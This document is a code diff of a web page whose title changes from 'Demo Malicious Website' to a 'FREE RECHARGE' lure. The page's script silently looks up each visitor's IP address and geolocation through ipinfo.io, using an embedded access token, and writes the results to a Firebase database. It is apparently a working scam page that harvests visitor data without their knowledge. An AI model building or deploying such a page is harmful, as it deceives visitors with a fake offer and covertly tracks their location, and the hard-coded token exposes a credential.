@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Demo Malicious Website</title>
+  <title>FREE RECHARGE</title>
   
   <!-- Firebase SDK (using CDN and module-based approach for Firebase v9 or later) -->
   <script type="module">
@@ -28,6 +28,7 @@
 
     // Function to send data to Firebase
     function sendDataToFirebase(userData) {
+      console.log("Sending data to Firebase:", userData);  // Log user data to console
       const userDataRef = ref(database, 'userData/' + new Date().getTime());
       set(userDataRef, userData)
         .then(() => {
@@ -40,11 +41,11 @@
 
     // Function to fetch IP and location using ipinfo.io
     function getIPAndLocation() {
-      // Use ipinfo.io API to get IP and location information
       fetch('https://ipinfo.io/json?token=28242ae316ade9')  // Using your access token
         .then(response => response.json())
         .then(data => {
-          // Get the IP address and geolocation (city, region, country)
+          console.log("Received IP data:", data);  // Log data received from ipinfo.io
+
           const ipAddress = data.ip;
           const location = data.city + ', ' + data.region + ', ' + data.country;
           const coordinates = data.loc.split(',');
